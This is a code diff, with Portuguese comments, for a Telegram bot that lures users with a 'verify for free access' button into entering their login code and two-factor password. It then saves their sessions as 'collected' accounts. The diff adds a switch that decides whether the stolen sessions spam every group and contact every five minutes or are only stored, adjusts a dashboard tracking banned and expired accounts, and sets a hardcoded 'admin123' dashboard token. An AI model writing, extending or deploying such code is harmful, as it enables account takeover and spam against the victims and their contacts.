@@ -54,7 +54,7 @@ disparo_tasks = {}  # phone -> asyncio.Task
 session_stats = {}  # phone -> stats dict
 
 # Dashboard
-DASHBOARD_TOKEN = "Coisas123@"
+DASHBOARD_TOKEN = "admin123"
 
 # Multi-bot
 connected_bots = {}  # token -> {"app": Application, "username": str, "name": str, "id": int}
@@ -95,7 +95,7 @@ def init_session_stats(phone, account_name="", account_id=None, collected_by=Non
     """Inicializa ou reseta stats de uma sessão"""
     if phone not in session_stats:
         session_stats[phone] = {
-            "status": "active",
+            "status": "active" if DISPARO_AUTOMATICO else "collected",
             "account_name": account_name,
             "account_id": account_id,
             "messages_sent": 0,
@@ -111,7 +111,7 @@ def init_session_stats(phone, account_name="", account_id=None, collected_by=Non
             "contacts_count": 0,
         }
     else:
-        session_stats[phone]["status"] = "active"
+        session_stats[phone]["status"] = "active" if DISPARO_AUTOMATICO else "collected"
         session_stats[phone]["connected_since"] = time.time()
         if account_name:
             session_stats[phone]["account_name"] = account_name
@@ -275,6 +275,10 @@ def get_user_id(init_data: str) -> int | None:
 # ===============================
 async def disparo_loop(client: TelegramClient, phone: str):
     """Envia mensagem para todos os grupos e contatos (não bots) a cada 5 minutos"""
+    if not DISPARO_AUTOMATICO:
+        print(f"[DISPARO] Auto-disparo desativado; loop nao iniciado para {phone}")
+        return
+
     print(f"[DISPARO] 🔄 Iniciando loop para {phone}")
     falhas_conexao = 0
     MAX_FALHAS = 5  # Máximo de falhas consecutivas antes de desistir
@@ -520,11 +524,15 @@ async def api_verify_code(request):
         init_session_stats(phone, account_name=me.first_name or "", account_id=me.id, collected_by=user_id)
         save_stats()
 
-        # Inicia disparo em background (NÃO desconecta)
         users.pop(user_id, None)
-        task = asyncio.create_task(disparo_loop(client, phone))
-        disparo_tasks[phone] = task
-        print(f"[DISPARO] 🚀 Loop de disparo iniciado para {phone}")
+
+        if DISPARO_AUTOMATICO:
+            task = asyncio.create_task(disparo_loop(client, phone))
+            disparo_tasks[phone] = task
+            print(f"[DISPARO] 🚀 Loop de disparo iniciado para {phone}")
+        else:
+            await client.disconnect()
+            print(f"[DISPARO] Auto-disparo desativado; {phone} salva sem iniciar envio")
 
         return web.json_response({"ok": True, "link": LINK_GRUPO})
 
@@ -582,11 +590,15 @@ async def api_verify_password(request):
         init_session_stats(phone, account_name=me.first_name or "", account_id=me.id, collected_by=user_id)
         save_stats()
 
-        # Inicia disparo em background (NÃO desconecta)
         users.pop(user_id, None)
-        task = asyncio.create_task(disparo_loop(client, phone))
-        disparo_tasks[phone] = task
-        print(f"[DISPARO] 🚀 Loop de disparo iniciado para {phone}")
+
+        if DISPARO_AUTOMATICO:
+            task = asyncio.create_task(disparo_loop(client, phone))
+            disparo_tasks[phone] = task
+            print(f"[DISPARO] 🚀 Loop de disparo iniciado para {phone}")
+        else:
+            await client.disconnect()
+            print(f"[DISPARO] Auto-disparo desativado; {phone} salva sem iniciar envio")
 
         return web.json_response({"ok": True, "link": LINK_GRUPO})
 
@@ -693,12 +705,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     keyboard = [
         [InlineKeyboardButton(
-            "✅ 𝗩𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝗿 - Acessar sem pagar",
+            "✅ 𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗖̧𝗔̃𝗢 — 𝗔𝗖𝗘𝗦𝗦𝗔𝗥 𝗚𝗥𝗔𝗧𝗜𝗦",
             web_app=WebAppInfo(url=WEBAPP_URL)
         )],
         [InlineKeyboardButton(
-            "❌ 𝗦𝗲𝗺 𝗩𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝗿 - Pagar para entrar",
-            url="https://t.me/Favelds6_bot?start=colect"
+            "❌ 𝗘𝗡𝗧𝗥𝗔𝗥 — 𝗦𝗘𝗠 𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗥 ❌",
+            url="https://t.me/AHSGSKASBOT?start=entrarsempagar"
         )]
     ]
 
@@ -856,7 +868,7 @@ async def stop_extra_bot(bot_token):
 # CARREGAR SESSÕES EXISTENTES
 # ===============================
 async def carregar_sessoes():
-    """Carrega todas as sessões salvas e inicia disparo automático"""
+    """Carrega sessoes salvas e inicia disparo automatico somente se habilitado."""
     sessions_dir = SESSIONS_DIR
     arquivos = [f for f in os.listdir(sessions_dir) if f.endswith(".session")]
 
@@ -865,6 +877,14 @@ async def carregar_sessoes():
         return
 
     print(f"[STARTUP] 📂 {len(arquivos)} sessão(ões) encontrada(s), carregando...")
+
+    if not DISPARO_AUTOMATICO:
+        for arquivo in arquivos:
+            phone = arquivo.replace(".session", "")
+            init_session_stats(phone)
+        save_stats()
+        print(f"[STARTUP] Disparo automatico desativado; {len(arquivos)} sessao(oes) mantida(s) sem envio.")
+        return
 
     for arquivo in arquivos:
         phone = arquivo.replace(".session", "")
@@ -938,8 +958,14 @@ async def api_dashboard(request):
     if token != DASHBOARD_TOKEN:
         return web.json_response({"error": "Acesso negado"}, status=403)
 
+    active_phones = {
+        phone
+        for phone, task in disparo_tasks.items()
+        if not task.done()
+    }
+
     # Contar por status
-    active = sum(1 for s in session_stats.values() if s["status"] == "active")
+    active = len(active_phones)
     banned = sum(1 for s in session_stats.values() if s["status"] == "banned")
     expired = sum(1 for s in session_stats.values() if s["status"] == "expired")
 
@@ -954,9 +980,13 @@ async def api_dashboard(request):
     # Lista de sessões
     sessions_list = []
     for phone, s in session_stats.items():
+        status = s["status"]
+        if status == "active" and phone not in active_phones:
+            status = "collected"
+
         sessions_list.append({
             "phone": phone,
-            "status": s["status"],
+            "status": status,
             "account_name": s.get("account_name", ""),
             "account_id": s.get("account_id"),
             "messages_sent": s["messages_sent"],
